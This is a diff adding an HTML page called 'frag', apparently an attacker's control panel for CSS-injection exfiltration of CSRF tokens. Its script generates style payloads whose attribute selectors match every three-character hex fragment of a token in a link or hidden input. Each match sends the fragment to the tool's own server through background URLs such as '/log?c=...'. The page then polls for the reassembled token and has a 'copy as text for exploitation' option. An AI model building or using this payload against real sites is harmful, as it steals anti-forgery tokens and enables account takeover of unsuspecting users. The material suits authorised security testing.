@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>frag</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #0a0a0a;
+    color: #c0c0c0;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', 'Courier New', monospace;
+    line-height: 1.6;
+    padding: 40px 20px;
+  }
+  .container { max-width: 720px; margin: 0 auto; }
+
+  .header { text-align: center; margin-bottom: 40px; }
+  .logo img {
+    height: 80px;
+  }
+  .subtitle {
+    font-size: 11px;
+    color: #444;
+    text-transform: uppercase;
+    letter-spacing: 4px;
+    margin-top: 4px;
+  }
+
+  .panel {
+    background: #111;
+    border: 1px solid #222;
+    border-radius: 6px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+  .panel-header {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: #00ff41;
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #1a1a1a;
+  }
+
+  .config-row {
+    display: flex;
+    align-items: center;
+    margin-bottom: 8px;
+    font-size: 13px;
+    gap: 12px;
+  }
+  .config-label {
+    color: #555;
+    width: 64px;
+    flex-shrink: 0;
+    text-align: right;
+  }
+  .config-input {
+    background: #0a0a0a;
+    border: 1px solid #333;
+    color: #e0e0e0;
+    font-family: inherit;
+    font-size: 13px;
+    padding: 6px 10px;
+    border-radius: 4px;
+    flex: 1;
+    min-width: 0;
+  }
+  .config-input:focus {
+    outline: none;
+    border-color: #00ff41;
+  }
+  select.config-input {
+    cursor: pointer;
+    -webkit-appearance: none;
+    appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M3 5l3 3 3-3' fill='none' stroke='%23555' stroke-width='1.5'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+    padding-right: 30px;
+  }
+  select.config-input option {
+    background: #111;
+    color: #e0e0e0;
+  }
+  .config-input.short { flex: none; width: 80px; }
+
+  .btn {
+    background: #00ff41;
+    color: #0a0a0a;
+    border: none;
+    padding: 10px 20px;
+    font-family: inherit;
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    border-radius: 4px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: background 0.15s;
+  }
+  .btn:hover { background: #00cc33; }
+  .btn:active { background: #009922; }
+  .btn-outline {
+    background: transparent;
+    color: #00ff41;
+    border: 1px solid #00ff41;
+  }
+  .btn-outline:hover { background: rgba(0,255,65,0.1); }
+
+  .token-box {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 16px;
+    font-size: 14px;
+    word-break: break-all;
+    color: #00ff41;
+    min-height: 48px;
+  }
+  .token-box.muted { color: #333; font-style: italic; }
+
+  .status {
+    font-size: 12px;
+    color: #555;
+    margin-left: 12px;
+    display: inline-block;
+  }
+  .status.ok { color: #00ff41; }
+
+  .actions { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+
+  .indicator {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: #333;
+    margin-right: 8px;
+  }
+  .indicator.active { background: #00ff41; animation: pulse 1.5s infinite; }
+  .indicator.done { background: #00ff41; }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  #testArea a { color: #e0e0e0; text-decoration: none; word-break: break-all; }
+  #testArea span { display: block; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="logo"><img src="/graphics/frag-small.png" alt="frag"></div>
+    <div class="subtitle">css token extractor</div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">configuration</div>
+    <div class="config-row">
+      <span class="config-label">type</span>
+      <select id="cfgType" class="config-input">
+        <option value="anchor">Anchor (&lt;a href="..."&gt;)</option>
+        <option value="hidden">Hidden input (&lt;input type="hidden"&gt;)</option>
+      </select>
+    </div>
+    <div class="config-row">
+      <span class="config-label">selector</span>
+      <input type="text" id="cfgSelector" class="config-input">
+    </div>
+    <div class="config-row">
+      <span class="config-label">attr</span>
+      <input type="text" id="cfgAttr" class="config-input">
+    </div>
+    <div class="config-row">
+      <span class="config-label">name</span>
+      <input type="text" id="cfgToken" class="config-input">
+    </div>
+    <div class="config-row">
+      <span class="config-label">start</span>
+      <input type="text" id="cfgStart" class="config-input" placeholder="e.g. token=">
+    </div>
+    <div class="config-row">
+      <span class="config-label">end</span>
+      <input type="text" id="cfgEnd" class="config-input" placeholder="e.g. &amp;operation=login">
+    </div>
+    <div class="config-row">
+      <span class="config-label">length</span>
+      <input type="number" id="cfgLength" class="config-input short" min="1">
+    </div>
+    <div style="margin-top:12px" class="actions">
+      <button class="btn" id="applyBtn">apply</button>
+      <span class="status" id="applyStatus"></span>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">payload</div>
+    <div class="actions">
+      <select id="copyMode" class="config-input" style="flex:none;width:220px">
+        <option value="test">Copy as HTML for test</option>
+        <option value="exploit">Copy as text for exploitation</option>
+      </select>
+      <button class="btn" id="copyBtn">copy</button>
+      <span class="status" id="copyStatus"></span>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">sample token</div>
+    <div class="token-box" id="sampleToken">-</div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">test area</div>
+    <div id="testArea" contenteditable="true" style="background:#0a0a0a;border:1px solid #222;border-radius:4px;padding:16px;min-height:60px;color:#888;font-size:13px">paste css here to test extraction</div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="indicator" id="statusDot"></span>extracted token</div>
+    <div class="token-box muted" id="extractedToken">waiting for extraction...</div>
+    <div style="margin-top:12px" class="actions">
+      <button class="btn btn-outline" id="refreshBtn">refresh</button>
+      <button class="btn btn-outline" id="resetBtn">reset</button>
+    </div>
+  </div>
+</div>
+
+<script>
+let CONFIG = null;
+
+const PRESETS = {
+  anchor: {
+    selector: 'a[href^="https://example.com/m/callback/email?token="]',
+    attribute: 'href',
+    tokenName: 'CSRF token',
+    startSelector: 'token=',
+    endSelector: '&operation=login',
+    tokenLength: 40,
+  },
+  hidden: {
+    selector: 'input[type="hidden"][name="csrf"]',
+    attribute: 'value',
+    tokenName: 'csrf',
+    startSelector: '',
+    endSelector: '',
+    tokenLength: 40,
+  },
+};
+
+async function copyAsHtml(html) {
+  const blob = new Blob([html], { type: 'text/html' });
+  await navigator.clipboard.write([new ClipboardItem({ 'text/html': blob })]);
+}
+
+function shortName(index) {
+  let length = 1;
+  while (index >= 26 * 36 ** (length - 1)) {
+    index -= 26 * 36 ** (length - 1);
+    length++;
+  }
+  const place = 36 ** (length - 1);
+  const first = String.fromCharCode(97 + Math.floor(index / place));
+  const rest = length === 1
+    ? ''
+    : (index % place).toString(36).padStart(length - 1, '0');
+  return first + rest;
+}
+
+function generateCSS(cfg) {
+  const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
+  const server = window.location.origin;
+  const isInput = tag === 'input';
+  const t = isInput ? '+*' : '';
+
+  let css = selector + '{';
+
+  let counter = 0;
+  const midVars = [];
+  const displayVars = [];
+  const hex = 'abcdef0123456789';
+
+  for (let i = 0; i < 16; i++) {
+    for (let j = 0; j < 16; j++) {
+      for (let k = 0; k < 16; k++) {
+        const combo = hex[i] + hex[j] + hex[k];
+        const n = shortName(counter++);
+
+        midVars.push('var(--' + n + ',none)');
+        displayVars.push('var(--m-' + n + ',"")');
+
+        if (useStartsWith) {
+          css += '&[' + attribute + '^="' + combo + '"]' + t + '{--d-s:"' + combo + '";--s:url(' + server + '/log?c=' + combo + '&t=s)}';
+        } else {
+          css += '&[' + attribute + '*="' + startContext + combo + '"]' + t + '{--d-s:"' + combo + '";--s:url(' + server + '/log?c=' + combo + '&t=s)}';
+        }
+
+        css += '&[' + attribute + '*="' + combo + '"]' + t + '{--m-' + n + ':",' + combo + '";--' + n + ':url(' + server + '/log?c=' + combo + '&t=m)}';
+
+        if (useEndsWith) {
+          css += '&[' + attribute + '$="' + combo + '"]' + t + '{--d-e:"' + combo + '";--e:url(' + server + '/log?c=' + combo + '&t=e)}';
+        } else {
+          css += '&[' + attribute + '*="' + combo + endContext + '"]' + t + '{--d-e:"' + combo + '";--e:url(' + server + '/log?c=' + combo + '&t=e)}';
+        }
+      }
+    }
+  }
+
+  if (isInput) {
+    css += "&+*::after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
+    css += '&+*{display:inline-block;background:var(--s,none),' + midVars.join(',') + ',var(--e,none)}';
+  } else {
+    css += "&:after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
+    css += 'background:var(--s,none),' + midVars.join(',') + ',var(--e,none)';
+  }
+
+  css += '}';
+
+  return '<style>' + css + '</style>';
+}
+
+function loadPreset(type) {
+  const preset = PRESETS[type];
+  if (!preset) return;
+  document.getElementById('cfgSelector').value = preset.selector;
+  document.getElementById('cfgAttr').value = preset.attribute;
+  document.getElementById('cfgToken').value = preset.tokenName;
+  document.getElementById('cfgStart').value = preset.startSelector;
+  document.getElementById('cfgEnd').value = preset.endSelector;
+  document.getElementById('cfgLength').value = preset.tokenLength;
+}
+
+function loadConfigToForm(cfg) {
+  document.getElementById('cfgSelector').value = cfg.selector;
+  document.getElementById('cfgAttr').value = cfg.attribute;
+  document.getElementById('cfgToken').value = cfg.tokenName;
+  document.getElementById('cfgStart').value = cfg.startContext ? cfg.startContext.slice(0, -2) : '';
+  document.getElementById('cfgLength').value = cfg.tokenLength;
+
+  if (cfg.tag === 'input') {
+    document.getElementById('cfgType').value = 'hidden';
+  } else {
+    document.getElementById('cfgType').value = 'anchor';
+  }
+}
+
+async function applyConfig() {
+  const body = {
+    selector: document.getElementById('cfgSelector').value,
+    attribute: document.getElementById('cfgAttr').value,
+    tokenName: document.getElementById('cfgToken').value,
+    startSelector: document.getElementById('cfgStart').value,
+    endSelector: document.getElementById('cfgEnd').value,
+    tokenLength: parseInt(document.getElementById('cfgLength').value, 10) || 40,
+  };
+
+  const status = document.getElementById('applyStatus');
+  try {
+    const res = await fetch('/api/config', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    CONFIG = await res.json();
+    document.getElementById('sampleToken').textContent = CONFIG.sampleToken;
+    document.getElementById('testArea').innerHTML = CONFIG.sampleHtml;
+    document.getElementById('extractedToken').textContent = 'waiting for extraction...';
+    document.getElementById('extractedToken').classList.add('muted');
+    document.getElementById('statusDot').className = 'indicator';
+    status.textContent = 'applied';
+    status.className = 'status ok';
+  } catch (e) {
+    status.textContent = 'failed';
+    status.className = 'status';
+  }
+  setTimeout(() => { status.textContent = ''; }, 2000);
+}
+
+let pollTimer = null;
+
+async function checkToken() {
+  try {
+    const res = await fetch('/api/token');
+    const data = await res.json();
+    const el = document.getElementById('extractedToken');
+    const dot = document.getElementById('statusDot');
+
+    if (data.status === 'ok') {
+      if (data.candidates) {
+        el.innerHTML = '<span style="color:#ff0">ambiguous (' + data.candidates.length + ' candidates):</span><br>' +
+          data.candidates.map(c => '<span style="color:#00ff41">' + c + '</span>').join('<br>');
+      } else {
+        el.textContent = data.token;
+      }
+      el.classList.remove('muted');
+      dot.className = 'indicator done';
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    } else if (data.status === 'partial') {
+      el.textContent = 'receiving chunks... (' + data.chunks + ' so far)';
+      el.classList.add('muted');
+      dot.className = 'indicator active';
+    } else {
+      el.textContent = 'waiting for extraction...';
+      el.classList.add('muted');
+      dot.className = 'indicator';
+    }
+  } catch {}
+}
+
+async function init() {
+  const res = await fetch('/config');
+  CONFIG = await res.json();
+
+  document.getElementById('sampleToken').textContent = CONFIG.sampleToken;
+
+  // populate form from server config
+  document.getElementById('cfgSelector').value = CONFIG.selector;
+  document.getElementById('cfgAttr').value = CONFIG.attribute;
+  document.getElementById('cfgToken').value = CONFIG.tokenName;
+  document.getElementById('cfgLength').value = CONFIG.tokenLength || 40;
+  if (CONFIG.tag === 'input') {
+    document.getElementById('cfgType').value = 'hidden';
+  }
+
+  // Reverse the start/end context to full selectors
+  // startContext is last 2 chars of startSelector, but we need the full startSelector
+  // Use presets to find matching values
+  const type = document.getElementById('cfgType').value;
+  const preset = PRESETS[type];
+  if (preset) {
+    document.getElementById('cfgStart').value = preset.startSelector;
+    document.getElementById('cfgEnd').value = preset.endSelector;
+  }
+
+  const testArea = document.getElementById('testArea');
+  testArea.innerHTML = CONFIG.sampleHtml;
+
+  testArea.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
+    testArea.innerHTML = html + CONFIG.sampleHtml;
+  });
+
+  document.getElementById('cfgType').addEventListener('change', (e) => {
+    loadPreset(e.target.value);
+  });
+
+  document.getElementById('applyBtn').addEventListener('click', applyConfig);
+
+  document.getElementById('copyBtn').addEventListener('click', async () => {
+    const status = document.getElementById('copyStatus');
+    const mode = document.getElementById('copyMode').value;
+    const css = generateCSS(CONFIG);
+    try {
+      if (mode === 'test') {
+        await copyAsHtml(css);
+      } else {
+        await navigator.clipboard.writeText(css);
+      }
+      status.textContent = 'copied';
+      status.className = 'status ok';
+    } catch (e) {
+      status.textContent = 'clipboard failed';
+      status.className = 'status';
+    }
+    setTimeout(() => { status.textContent = ''; }, 2000);
+  });
+
+  document.getElementById('refreshBtn').addEventListener('click', checkToken);
+
+  document.getElementById('resetBtn').addEventListener('click', async () => {
+    await fetch('/api/reset');
+    document.getElementById('extractedToken').textContent = 'waiting for extraction...';
+    document.getElementById('extractedToken').classList.add('muted');
+    document.getElementById('statusDot').className = 'indicator';
+  });
+
+  pollTimer = setInterval(checkToken, 2000);
+}
+
+init();
+</script>
+</body>
+</html>
